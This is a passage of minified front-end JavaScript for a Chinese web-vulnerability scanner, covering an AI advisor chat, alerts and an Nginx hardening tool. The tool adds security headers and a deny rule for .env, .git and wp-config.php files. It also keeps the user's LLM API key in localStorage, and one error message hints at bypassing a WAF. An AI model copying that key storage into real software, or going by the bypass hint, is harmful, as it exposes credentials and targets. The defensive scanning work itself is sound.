onclick="createTeam()">创建团队</button>',i+="  </div>",i+='  <div id="evo-team-list"></div>',i+="</div>"):e==="learning"&&(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">智能学习洞察</div>',i+='  <div class="evo-empty">系统会基于您的历史扫描自动归纳模式、预测风险与生成建议</div>',i+="</div>");let t=document.getElementById("evolution-content"),r=document.createElement("div");r.className="evo-modal-bg",r.innerHTML='<div class="evo-modal"><div class="evo-modal-close" onclick="this.parentNode.parentNode.remove()">&times;</div>'+i+"</div>",t.appendChild(r)}function zo(){let e=document.getElementById("mon-url").value.trim(),i=parseInt(document.getElementById("mon-freq").value)||3600;if(!e){ie("请输入 URL","error");return}Se("/api/monitors",{method:"POST",body:JSON.stringify({url:e,frequency:i})}).then(function(t){return t.json()}).then(function(t){t.id||t.monitor_id?(ie("监控已创建","success"),Zt()):ie("创建失败","error")}).catch(function(t){ie("创建失败: "+t.message,"error")})}function Sn(){let e=document.getElementById("evo-ai-q");if(!e)return;let i=e.value.trim();i&&En(i)}let Yt=!1;function En(e){if(Yt)return;let i=document.getElementById("evo-ai-q"),t=document.getElementById("evo-ai-msgs"),r=document.getElementById("ai-send-btn");if(!t)return;Yt=!0,t.innerHTML+='<div class="ai-msg user">  <div class="ai-msg-avatar user">我</div>  <div class="ai-msg-body">    <div class="ai-msg-content">'+pe(e)+"</div>  </div></div>",i&&(i.value=""),r&&(r.disabled=!0,r.textContent="思考中…");let s="typing-"+Date.now();t.innerHTML+='<div class="ai-msg bot" id="'+s+'">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content"><span class="ai-typing">...</span></div></div></div>',t.scrollTop=t.scrollHeight,Se("/api/ai/chat",{method:"POST",body:JSON.stringify({message:e})}).then(function(o){return o.json()}).then(function(o){let a=document.getElementById(s);a&&a.remove();let n=o&&o.response||o&&o.reply||o&&o.message||JSON.stringify(o),c="";if(o&&o.llm_used){let g=(o.llm_provider||"LLM").toUpperCase();c='<span class="ai-tag real">真 '+pe(g)+"</span>"}else c='<span class="ai-tag local">本地规则</span>';t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body">    <div class="ai-msg-name">安全顾问 '+c+'</div>    <div class="ai-msg-content">'+To(n)+"</div>  </div></div>",t.scrollTop=t.scrollHeight}).catch(function(o){let a=document.getElementById(s);a&&a.remove(),t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content">请求失败: '+pe(o.message)+"</div></div></div>"}).finally(function(){Yt=!1,r&&(r.disabled=!1,r.textContent="发送")})}function Io(){let e=document.getElementById("ai-status-bar");e&&fetch("/api/ai/status").then(function(i){return i.json()}).then(function(i){!i||!i.success||(i.llm_enabled&&i.api_key_configured?e.innerHTML='<span class="ai-status-dot ok"></span><span class="ai-status-text">已连接真实 LLM · '+pe(i.provider)+" / "+pe(i.model)+"</span>":e.innerHTML='<span class="ai-status-dot local"></span><span class="ai-status-text">本地规则模式（未配置 LLM Key）</span>')}).catch(function(){e.innerHTML='<span class="ai-status-dot err"></span><span class="ai-status-text">无法获取安全顾问状态</span>'})}function To(e){if(!e)return"";let i=String(e).split(/```/),t=[];for(let r=0;r<i.length;r++)if(r%2===1)t.push('<pre class="ai-code"><code>'+pe(i[r])+"</code></pre>");else{let s=pe(i[r]);s=s.replace(/`([^`\n]+)`/g,'<code class="ai-code-inline">$1</code>'),s=s.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),s.split(/\n\n+/).forEach(function(a){let n=a.replace(/\n/g," ").trim();n&&t.push("<p>"+n+"</p>")})}return t.join("")}function Co(){let e=document.getElementById("team-name").value.trim();if(!e){ie("请输入团队名","error");return}Se("/api/teams",{method:"POST",body:JSON.stringify({name:e})}).then(function(i){return i.json()}).then(function(i){i.id||i.team_id?(ie("团队已创建","success"),Zt()):ie("创建失败: "+JSON.stringify(i),"error")}).catch(function(i){ie("创建失败: "+i.message,"error")})}function Ao(e){let i=We.find(function(o){return o.id===e});if(!i)return;let t=prompt("修改域名:",i.domain||"");if(t===null)return;let r=prompt("修改负责人:",i.owner||"");if(r===null)return;let s=prompt("修改描述:",i.description||"");s!==null&&Se("/api/assets/"+e,{method:"PATCH",body:JSON.stringify({domain:t.trim(),owner:r.trim(),description:s.trim()})}).then(function(o){return o.json()}).then(function(o){o.id||o.success?(ie("资产更新成功","success"),xi()):ie(tt(o)||"更新失败","error")}).catch(function(o){ie("更新失败: "+o.message,"error")})}function Bo(e){confirm("确定要删除此资产吗？")&&Se("/api/assets/"+e,{method:"DELETE"}).then(function(i){if(i.ok||i.status===204)ie("资产已删除","success"),xi();else return i.json().then(function(t){throw new Error(tt(t)||"删除失败")})}).catch(function(i){ie("删除失败: "+i.message,"error")})}function Lo(e,i){if(!i)return;let t=i;/^https?:\/\//i.test(t)||(t="https://"+t),document.getElementById("scan-url").value=t,bt("scan"),typeof window.startScanDirect=="function"&&window.startScanDirect()}function Oo(){let e=document.getElementById("ai-chat");e&&(document.getElementById("ai-fab-badge"),e.classList.contains("show")?(e.classList.remove("show"),e.style.display=""):(e.classList.add("show"),e.style.display="",Ro(),setTimeout(function(){let i=document.getElementById("ai-input");i&&i.focus()},300)))}function qe(e,i){let t=document.getElementById("ai-chat-body");if(!t)return null;let r=document.createElement("div");r.className="ai-msg "+(i||"bot");let s=Mo(e||"");r.innerHTML=s;let o=r.querySelectorAll("pre");for(let a=0;a<o.length;a++)(function(n){let c=document.createElement("div");c.className="ai-code-block";let g=document.createElement("button");g.className="ai-code-copy",g.textContent="复制",g.onclick=function(){let v=n.textContent;if(navigator.clipboard)navigator.clipboard.writeText(v).then(function(){g.textContent="已复制",setTimeout(function(){g.textContent="复制"},1500)});else{let d=document.createElement("textarea");d.value=v,document.body.appendChild(d),d.select(),document.execCommand("copy"),document.body.removeChild(d),g.textContent="已复制",setTimeout(function(){g.textContent="复制"},1500)}},n.parentNode.insertBefore(c,n),c.appendChild(g),c.appendChild(n)})(o[a]);return t.appendChild(r),t.scrollTop=t.scrollHeight,i==="bot"&&(document.getElementById("ai-chat").classList.contains("show")||Po()),r}function Mo(e){if(!e)return"";let i=e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"),t=[];return i=i.replace(/```([\s\S]*?)```/g,function(r,s){let o=s.replace(/^\n+|\n+$/g,"").split(`
`),a="";o.length>0&&/^(nginx|apache|javascript|python|bash|sql|html|css|json|java|php|ruby|go|rust)$/i.test(o[0].trim())&&(a=o[0].trim(),o=o.slice(1));let n=o.join(`
`),c=t.length;return t.push({code:n,lang:a}),"__CODE_BLOCK_"+c+"__"}),i=i.replace(/`([^`\n]+)`/g,'<code class="ai-inline-code">$1</code>'),i=i.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),i=i.replace(/^---\s*$/gm,'<hr class="ai-divider">'),i=i.replace(/(^|\n)((?:\s*[-*]\s+[^\n]+\n?)+)/g,function(r,s,o){let n=o.trim().split(`
`).filter(function(c){return c.trim()}).map(function(c){return"<li>"+c.replace(/^\s*[-*]\s+/,"")+"</li>"}).join("");return s+'<ul class="ai-list">'+n+"</ul>"}),i=i.replace(/(^|\n)((?:\s*\d+\.\s+[^\n]+\n?)+)/g,function(r,s,o){let n=o.trim().split(`
`).filter(function(c){return c.trim()}).map(function(c){return"<li>"+c.replace(/^\s*\d+\.\s+/,"")+"</li>"}).join("");return s+'<ol class="ai-list ol">'+n+"</ol>"}),i=i.replace(/__CODE_BLOCK_(\d+)__/g,function(r,s){let o=t[parseInt(s)];return'<div class="ai-code-wrap">'+(o.lang?'<span class="ai-code-lang">'+o.lang+"</span>":"")+"<pre><code>"+o.code+"</code></pre></div>"}),i=i.replace(/\n/g,"<br>"),i}let Mt=0;function Po(){Mt++;let e=document.getElementById("ai-fab-badge");e&&(e.textContent=Mt>99?"99+":String(Mt),e.style.display="")}function Ro(){Mt=0;let e=document.getElementById("ai-fab-badge");e&&(e.style.display="none",e.textContent="0")}function Fo(){let e=document.getElementById("ai-chat-body");if(!e)return null;let i=document.createElement("div");return i.className="ai-msg bot ai-typing-wrap",i.innerHTML='<span class="ai-typing"><span></span><span></span><span></span></span>',e.appendChild(i),e.scrollTop=e.scrollHeight,i}let Bt=!1;async function zn(){if(Bt)return;let e=document.getElementById("ai-input"),i=(e.value||"").trim();if(!i)return;if(Bt=!0,qe(i,"user"),e.value="",!Be()){qe("请先登录后再使用安全顾问。登录后我还能根据你的扫描历史给出个性化建议。","bot"),Bt=!1;return}let t=Fo();try{let r=Tn(),s={message:i};r.api_key&&(s.api_key=r.api_key,s.provider=r.provider,s.model=r.model,s.use_llm=r.use_llm!==!1);let o=await Se("/api/ai-advisor",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}),a=await o.json();t&&t.parentNode&&t.remove(),o.ok?qe(a.reply||"（无回复）","bot"):o.status===429?qe("你问得太快啦，让我歇一会儿～ 1 分钟后再试试吧！","bot"):o.status===401||o.status===403?qe("登录状态好像过期了，刷新一下页面重新登录试试？","bot"):qe(`抱歉，我刚才处理出现了问题。你再说一遍刚才的问题好吗？

（错误：`+pe(tt(a))+"）","bot")}catch{t&&t.parentNode&&t.remove(),qe(`网络连接出现问题，检查一下网络连接再试试？

如果问题一直出现，可以刷新页面试试。`,"bot")}finally{Bt=!1}}function jo(e){let i=document.getElementById("ai-input");i&&(i.value=e),zn()}function In(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"网络连接超时，请检查 URL 是否可访问":/dns|getaddrinfo|Name or service not known/i.test(i)?"域名解析失败，请检查域名是否正确":/403|forbidden/i.test(i)?"目标站点拒绝访问，可能需要授权或绕过 WAF":/404|not found/i.test(i)?"目标页面不存在，请检查 URL 路径":/ssl|certificate|handshake/i.test(i)?"SSL/TLS 握手失败，证书可能无效或过期":/refused|connect/i.test(i)?"连接被拒绝，目标站点可能不可达":/authorized|授权/i.test(i)?"请先勾选「我已获得授权扫描此目标」":/rate|limit|频率/i.test(i)?"扫描频率超限，请稍后再试":i.length>60?i.substring(0,60)+"...":i}window.friendlyError=In;document.addEventListener("DOMContentLoaded",function(){Ke(),setInterval(Ke,6e4);try{}catch(e){console.warn("initScanPage error:",e)}});function Ho(){try{let e=`server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/html;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \\.php$ {
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
}`,i=document.getElementById("fixer-input");i&&(i.value=e),ie("已加载示例 Nginx 配置")}catch(e){console.error("loadSampleConfig error:",e),ie("加载示例配置失败: "+(e.message||String(e)),"error")}}function No(){try{if(!confirm("确定要清空当前配置内容吗？"))return;let e=document.getElementById("fixer-input"),i=document.getElementById("fixer-result");e&&(e.value=""),i&&(i.innerHTML=""),ie("已清空")}catch(e){console.error("clearFixer error:",e),ie("清空失败: "+(e.message||String(e)),"error")}}function Do(){Pi("fixer-analyze-btn",!0),setTimeout(function(){Pi("fixer-analyze-btn",!1)},600);let e=document.getElementById("fixer-input");if(!e)return;let i=e.value.trim();if(!i){ie("请先输入或粘贴 Nginx 配置");return}try{let t=Uo(i);ri=t,qo(t,i)}catch(t){console.error("analyzeFixer error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">分析失败: '+pe(t.message||String(t))+"</p></div>")}}function Uo(e){let i=[];e.split(`
`),/Strict-Transport-Security/i.test(e)||i.push({name:"HSTS 未配置",severity:"high",reason:"未设置 Strict-Transport-Security 头，浏览器不会强制使用 HTTPS，可能导致降级攻击。",fix:'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;'}),/Content-Security-Policy/i.test(e)||i.push({name:"CSP 未配置",severity:"high",reason:"未设置 Content-Security-Policy 头，网站容易受到 XSS 攻击和数据注入。",fix:`add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'" always;`}),/X-Frame-Options/i.test(e)||i.push({name:"X-Frame-Options 未配置",severity:"medium",reason:"未设置 X-Frame-Options 头，网站可能被嵌入到恶意页面的 iframe 中进行点击劫持攻击。",fix:'add_header X-Frame-Options "DENY" always;'}),/X-Content-Type-Options/i.test(e)||i.push({name:"X-Content-Type-Options 未配置",severity:"medium",reason:"未设置 X-Content-Type-Options 头，浏览器可能进行 MIME 类型嗅探，导致安全问题。",fix:'add_header X-Content-Type-Options "nosniff" always;'}),/Referrer-Policy/i.test(e)||i.push({name:"Referrer-Policy 未配置",severity:"low",reason:"未设置 Referrer-Policy 头，可能泄露敏感 URL 信息给第三方网站。",fix:'add_header Referrer-Policy "strict-origin-when-cross-origin" always;'}),/Permissions-Policy/i.test(e)||i.push({name:"Permissions-Policy 未配置",severity:"low",reason:"未设置 Permissions-Policy 头，浏览器可能允许不必要的权限访问（摄像头、麦克风等）。",fix:'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;'});let t=/listen\s+443/i.test(e),r=/return\s+301\s+https/i.test(e)||/rewrite.*https/i.test(e);!t&&!r&&/listen\s+80/i.test(e)&&i.push({name:"HTTP 到 HTTPS 跳转未配置",severity:"high",reason:"仅监听 HTTP 80 端口且未配置 HTTPS 跳转，所有通信为明文传输。",fix:`server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}`}),/\.env|deny\s+all|location.*\.(env|git|sql|zip|bak)/i.test(e)||i.push({name:"敏感文件拦截未配置",severity:"high",reason:"未配置敏感文件访问拦截规则，.env、.git、.sql 等文件可能被直接访问。",fix:`location ~ /(.env|.git|.gitignore|.*.sql|.*.zip|.*.tar.gz|.*.bak|.*.log|wp-config.php) {
    deny all;
    return 403;
}`});let s=e,o=[],a=[];if(i.forEach(function(c){c.name==="敏感文件拦截未配置"?a.push(c.fix):c.name!=="HTTP 到 HTTPS 跳转未配置"&&o.push(c.fix)}),o.length>0||a.length>0){let c=s.lastIndexOf("}");if(c>0){let g=s.substring(0,c),v=s.substring(c);o.length>0&&o.forEach(function(d){g+="    "+d+`
`}),a.length>0&&a.forEach(function(d){d.split(`
`).forEach(function(h){h.trim()&&(g+="    "+h.trim()+`
`)})}),s=g+v}}let n=$o(e,s);return{issues:i,fixed:s,diff:n}}function $o(e,i){let t=e.split(`
`),r=i.split(`
`),s=[],o=!1;for(let a=0;a<r.length;a++)a<t.length?t[a]!==r[a]?(o||(s.push({type:"context",text:"..."}),o=!0),s.push({type:"add",text:"+ "+r[a]})):(o&&a>0&&(s.push({type:"context",text:"..."}),o=!1),s.push({type:"context",text:"  "+r[a]})):s.push({type:"add",text:"+ "+r[a]});return s}function qo(e,i){try{e=e||{issues:[],fixed:"",diff:[]},e.issues=e.issues||[],e.diff=e.diff||[];let t="",r=0,s=0,o=0;e.issues.forEach(function(n){n.severity==="high"?r++:n.severity==="medium"?s++:o++}),t+='<div class="card fade-in-up">',t+='<div class="card-title">检测结果</div>',t+='<div class="risk-stats" style="margin-bottom:0">',t+='<div class="risk-stat high"><div class="num">'+r+'</div><div class="label">高严重</div></div>',t+='<div class="risk-stat medium"><div class="num">'+s+'</div><div class="label">中严重</div></div>',t+='<div class="risk-stat low"><div class="num">'+o+'</div><div class="label">低严重</div></div>',t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.1s">',t+='<div class="card-title">修复点清单</div>',e.issues.forEach(function(n){t+='<div class="issue-item">',t+='<span class="issue-severity '+n.severity+'">'+(n.severity==="high"?"高":n.severity==="medium"?"中":"低")+"</span>",t+="<div>",t+="<strong>"+pe(n.name)+"</strong>",t+='<p class="issue-reason">'+pe(n.reason)+"</p>",t+="</div></div>"}),t+="</div>",t+='<div class="card fade-in-up" style="animation-delay:0.2s">',t+='<div class="card-title">修复前后对比</div>',t+='<div class="compare-grid">',t+='<div class="compare-col"><h4><span class="dot red"></span>修复前</h4>',t+='<textarea class="compare-textarea" readonly>'+pe(i)+"</textarea></div>",t+='<div class="compare-col"><h4><span class="dot green"></span>修复后 <button class="copy-btn-sm" onclick="copyFixedConfig(this)" data-state="idle" aria-label="复制修复后配置">复制</button></h4>',t+='<textarea class="compare-textarea fixed-textarea" readonly>'+pe(e.fixed)+"</textarea></div>",t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.3s">',t+='<div class="card-title">Diff 展示</div>',t+='<div class="diff-container">',e.diff.forEach(function(n){t+='<div class="diff-line '+n.type+'">'+pe(n.text)+"</div>"}),t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.4s">',t+='<div class="card-title">操作</div>',t+='<div class="fixer-btns">',t+='<button class="fixer-btn success" onclick="copyFixerResult()">复制修复后配置</button>',t+='<button class="fixer-btn primary" onclick="downloadNginxConf()">下载 nginx.conf</button>',t+='<button class="fixer-btn success" onclick="downloadRepairReport()">下载修复报告包</button>',t+="</div></div>";let a=document.getElementById("fixer-result");a&&(a.innerHTML=t)}catch(t){console.error("renderFixerResult error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">渲染失败: '+pe(t.message||String(t))+"</p></div>")}}function Wo(){let e=document.querySelector("#fixer-result .compare-col:last-child textarea");if(!e)return;let i=e.value,t=new Blob([i],{type:"text/plain;charset=utf-8"}),r=URL.createObjectURL(t),s=document.createElement("a");s.href=r,s.download="nginx.conf",document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(r),ie("nginx.conf 已下载")}function Zo(){if(!ri){ie("请先分析配置");return}let e=ri,i=`=== 漏洞哨兵修复报告 ===
`;i+="生成时间："+new Date().toLocaleString("zh-CN")+`

`,i+=`--- 原始风险 ---
`,e.issues.forEach(function(o,a){i+=a+1+". ["+o.severity.toUpperCase()+"] "+o.name+`
`,i+="   原因："+o.reason+`
`}),i+=`
--- 修复项 ---
`,e.issues.forEach(function(o,a){i+=a+1+". "+o.name+`：已修复
`}),i+=`
--- 修复后配置 ---
`,i+=e.fixed+`
`,i+=`
--- 复测建议 ---
`,i+=`1. 使用 curl -I 检查响应头是否包含安全头
`,i+=`2. 访问 /.env 等敏感路径应返回 403
`,i+=`3. 使用 SSL Labs 检测 HTTPS 配置
`,i+=`4. 检查 Content-Security-Policy 是否生效
`;let t=new Blob([i],{type:"text/plain;charset=utf-8"}),r=URL.createObjectURL(t),s=document.createElement("a");s.href=r,s.download="repair-report.txt",document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(r),ie("修复报告已下载")}function Vo(e,i){if(i)try{let t=decodeURIComponent(atob(i));Xo(t),ie("已复制到剪贴板")}catch{ie("复制失败")}}function Xo(e){if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(e);else{let i=document.createElement("textarea");i.value=e,i.style.position="fixed",i.style.left="-9999px",document.body.appendChild(i),i.select(),document.execCommand("copy"),document.body.removeChild(i)}}function Go(e){document.querySelectorAll(".profile-tab").forEach(function(t){t.style.display="none"});let i=document.getElementById("profile-tab-"+e);i&&(i.style.display="block",i.scrollIntoView({behavior:"smooth",block:"start"})),e==="history"&&renderScanHistory(),e==="monitor"&&renderMonitorTargets(),e==="ai-config"&&Cn(),e==="alerts"&&wi(),e==="notifications"&&ia(),e==="credits"&&pi()}function Jo(e,i){let t=document.getElementById("setting-"+i);if(!t)return;let r=t.dataset.enabled==="true";t.dataset.enabled=r?"false":"true",t.classList.toggle("on",!r);let s=!r;i==="darkMode"&&(s?(document.documentElement.setAttribute("data-theme","dark"),(function(){try{localStorage.setItem("vs_dark","1")}catch{}})()):(document.documentElement.removeAttribute("data-theme"),(function(){try{localStorage.removeItem("vs_dark")}catch{}})()),updateThemeIcon(s)),i==="autoSave"&&(function(){try{localStorage.setItem("vs_autosave",s?"1":"0")}catch{}})(),i==="notify"&&(function(){try{localStorage.setItem("vs_notify",s?"1":"0")}catch{}})(),ie("设置已更新")}function Tn(){try{let e=localStorage.getItem("vs_ai_config");if(e)return JSON.parse(e)}catch{}return{api_key:"",provider:"openai",model:"",use_llm:!0}}function Ko(){let e=document.getElementById("ai-config-apikey").value.trim(),i=document.getElementById("ai-config-provider").value,t=document.getElementById("ai-config-model").value.trim(),r=document.getElementById("setting-useLLM").dataset.enabled==="true",s={api_key:e,provider:i,model:t,use_llm:r};try{localStorage.setItem("vs_ai_config",JSON.stringify(s)),ie("安全顾问配置已保存")}catch(o){ie("保存失败："+(o.message||"浏览器存储受限"),"error")}}function Yo(){try{localStorage.removeItem("vs_ai_config"),document.getElementById("ai-config-apikey").value="",document.getElementById("ai-config-provider").value="openai",document.getElementById("ai-config-model").value="";let e=document.getElementById("setting-useLLM");e&&(e.dataset.enabled="true",e.textContent="已开启",e.style.color="var(--success)"),ie("安全顾问配置已清除")}catch{}}function Qo(e){let i=document.getElementById("setting-"+(e==="useLLM"?"useLLM":e));if(!i)return;let t=i.dataset.enabled==="true";i.dataset.enabled=t?"false":"true",i.classList.toggle("on",!t)}function wi(e){let i=document.getElementById("alerts-list");i&&(i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取告警...</div>',fetch("/api/alerts?limit=20&unread_only=false",{headers:Je()}).then(function(t){return t.json()}).then(function(t){let r=t.alerts||[];if(r.length===0){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无告警记录</div>',document.getElementById("alerts-pagination").style.display="none";return}let s="";r.forEach(function(o){let a=!!o.is_read,n="";o.alert_type==="high_risk_found"||o.alert_type==="monitor_down"?n='<span style="background:var(--danger);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">高危</span>':o.alert_type==="score_drop"?n='<span style="background:var(--warning);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">评分下降</span>':o.alert_type==="scan_complete"&&(n='<span style="background:var(--success);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">完成</span>'),s+='<div class="menu-item" style="margin-bottom:8px;opacity:'+(a?"0.7":"1")+'">',s+='<div style="flex:1">',s+='<div style="font-weight:600;font-size:14px">'+pe(o.title||o.message||"告警")+n+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+pe(o.created_at||"")+"</div>",s+='<div style="font-size:13px;color:var(--text);margin-top:4px">'+pe(o.message||"")+"</div>",s+="</div>",a||(s+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:8px;white-space:nowrap" onclick="markAlertRead('+o.id+', event)">标记已读</button>'),s+="</div>"}),i.innerHTML=s,document.getElementById("alerts-pagination").style.display="none",Ke()}).catch(function(t){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">读取失败</div>'}))}function ea(e,i){i&&i.stopPropagation(),fetch("/api/alerts/"+e+"/read",{method:"POST",headers:Je()}).then(function(t){return t.json()}).then(function(t){t.success&&(wi(),Ke())})}function ta(){fetch("/api/alerts?limit=100",{headers:Je()}).then(function(e){return e.json()}).then(function(e){let t=(e.alerts||[]).filter(function(s){return!s.is_read});if(t.length===0){ie("没有未读告警");return}let r=0;t.forEach(function(s){fetch("/api/alerts/"+s.id+"/read",{method:"POST",headers:Je()}).then(function(){r++,r>=t.length&&(wi(),Ke(),ie("已全部标记为已读"))})})})}function Ke(){if(!Be()){let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none");return}fetch("/api/alerts/unread-count",{headers:Je()}).then(function(e){return e.json()}).then(function(e){let i=document.getElementById("nav-alert-badge");if(!i)return;let t=e.unread_count||0;t>0?(i.textContent=t>99?"99+":t,i.style.display="inline-block"):i.style.display="none"})}function ia(){fetch("/api/me/notifications",{headers:Je()}).then(function(e){return e.json()}).then(function(e){if(e.success){let i=document.getElementById("notify-email-input"),t=document.getElementById("notify-webhook-input"),r=document.getElementById("notify-threshold-select");i&&(i.value=e.email||""),t&&(t.value=e.webhook||""),r&&(r.value=e.threshold||"high")}})}function na(){let e=document.getElementById("notify-email-input").value.trim(),i=document.getElementById("notify-webhook-input").value.trim(),t=document.getElementById("notify-threshold-select").value;fetch("/api/me/notifications",{method:"POST",headers:Object.assign({"Content-Type":"application/json"},Je()),body:JSON.stringify({email:e,webhook:i,threshold:t})}).then(function(r){return r.json()}).then(function(r){r.success?ie("通知设置已保存","success"):ie(r.error||"保存失败","error")})}function ra(){let e=document.getElementById("ai-config-apikey"),i=document.getElementById("ai-config-eye");!e||!i||(e.type==="password"?(e.type="text",i.textContent="隐藏"):(e.type="password",i.textContent="显示"))}function Cn(){let e=Tn(),i=document.getElementById("ai-config-apikey"),t=document.getElementById("ai-config-provider"),r=document.getElementById("ai-config-model"),s=document.getElementById("setting-useLLM");if(i&&(i.value=e.api_key||""),t&&(t.value=e.provider||"openai"),r&&(r.value=e.model||""),s){let o=e.use_llm!==!1;s.dataset.enabled=o?"true":"false",s.classList.toggle("on",o)}}let Ze=null;function An(){if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches||document.getElementById("pwa-install-banner"))return;let e=document.createElement("div");e.id="pwa-install-banner",e.style.cssText="position:fixed;left:16px;right:16px;bottom:16px;z-index:9998;background:#1e293b;color:#fff;border:1px solid rgba(115,201,144,0.35);border-radius:12px;padding:12px 14px;box-shadow:0 14px 32px rgba(0,0,0,0.28);display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap",e.innerHTML='<div style="min-width:220px;flex:1"><div style="font-size:13px;font-weight:700;margin-bottom:2px">安装为桌面应用</div><div style="font-size:12px;color:#cbd5e1;line-height:1.5">把漏洞哨兵加入桌面或开始菜单，像 App 一样直接打开。</div></div><div style="display:flex;gap:8px;flex-wrap:wrap"><button id="pwa-install-btn" style="background:#73c990;color:#0f172a;border:none;padding:8px 14px;border-radius:8px;font-weight:700;cursor:pointer">立即安装</button><button id="pwa-install-close" style="background:transparent;color:#cbd5e1;border:1px solid rgba(203,213,225,0.28);padding:8px 14px;border-radius:8px;cursor:pointer">稍后</button></div>',document.body.appendChild(e);var i=document.getElementById("pwa-install-close"),t=document.getElementById("pwa-install-btn");i&&i.addEventListener("click",function(){e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}}),t&&t.addEventListener("click",async function(){Ze?(Ze.prompt(),await Ze.userChoice,Ze=null):ie("浏览器未准备好安装提示，可在菜单里选择“安装应用”。","info"),e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}})}window.addEventListener("beforeinstallprompt",function(e){e.preventDefault(),Ze=e;try{if(localStorage.getItem("vs_pwa_banner_hidden")==="true")return}catch{}An()});window.addEventListener("appinstalled",function(){Ze=null;const e=document.getElementById("pwa-install-banner");e&&e.remove()});document.addEventListener("DOMContentLoaded",function(){let e=ke("app");e&&Si&&(e.innerHTML=Si);try{vo()}catch(d){console.warn("initAuthCheckboxBinding error:",d)}try{Ze&&localStorage.getItem("vs_pwa_banner_hidden")!=="true"&&An()}catch{}Un().then(function(d){let f=d&&d.data||d||{};f.stripe_publishable_key&&(window.__STRIPE_PUBLISHABLE_KEY__=f.stripe_publishable_key),f.public_base_url&&(window.__PUBLIC_BASE_URL__=f.public_base_url)}).catch(function(){});let i=ke("skeleton-screen");i&&i.classList.add("hidden"),setTimeout(function(){i&&(i.style.display="none")},350);let t={quick:"约 1-2 秒 · 仅响应头",standard:"约 3-5 秒 · 推荐",deep:"约 10+ 秒 · 含攻击测试"};document.querySelectorAll(".scan-depth-opt").forEach(function(d){d.addEventListener("click",function(f){f.preventDefault();let h=this.getAttribute("data-value"),m=this.querySelector('input[type="radio"]');m&&(m.checked=!0,m.dispatchEvent(new Event("change",{bubbles:!0}))),document.querySelectorAll(".scan-depth-opt").forEach(function(y){y.classList.remove("active"),y.style.background="var(--bg)",y.style.color="var(--text)"}),this.classList.add("active"),this.style.background="var(--primary)",this.style.color="#fff";let u=document.getElementById("depth-hint");u&&(u.textContent=t[h]||"约 3-5 秒 · 推荐")})});try{updateProfileStats()}catch(d){console.warn("updateProfileStats error:",d)}try{lt()}catch(d){console.warn("updateAuthUI error:",d)}try{Cn()}catch(d){console.warn("renderAIConfig error:",d)}try{let d=document.getElementById("setting-notify");if(d){let f=localStorage.getItem("vs_notify")!=="0";d.dataset.enabled=f?"true":"false",d.classList.toggle("on",f)}}catch{}Be()&&typeof window.loadTrendChart=="function"&&window.loadTrendChart(30),Be()&&Se("/api/history?limit=1").then(function(d){d.status===401&&typeof ie=="function"&&ie("登录已过期，请重新登录")}).catch(function(){});try{if(localStorage.getItem("vs_dark")==="1"){document.documentElement.setAttribute("data-theme","dark");let d=ke("setting-darkMode");d&&(d.dataset.enabled="true",d.textContent="已开启",d.style.color="var(--success)"),s(!0)}}catch{}function r(){let d=document.documentElement.getAttribute("data-theme")==="dark";if(d){document.documentElement.removeAttribute("data-theme");try{localStorage.removeItem("vs_dark")}catch{}let f=ke("setting-darkMode");f&&(f.dataset.enabled="false",f.textContent="未开启",f.style.color="var(--text-lighter)"),ie("已切换至亮色模式")}else{document.documentElement.setAttribute("data-theme","dark");try{localStorage.setItem("vs_dark","1")}catch{}let f=ke("setting-darkMode");f&&(f.dataset.enabled="true",f.textContent="已开启",f.style.color="var(--success)"),ie("已切换至暗色模式")}s(!d)}window.toggleThemeQuick=r;function s(d){let f=ke("theme-icon");f&&(d?f.innerHTML='<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>':f.innerHTML='<circle cx="12" cy="12" 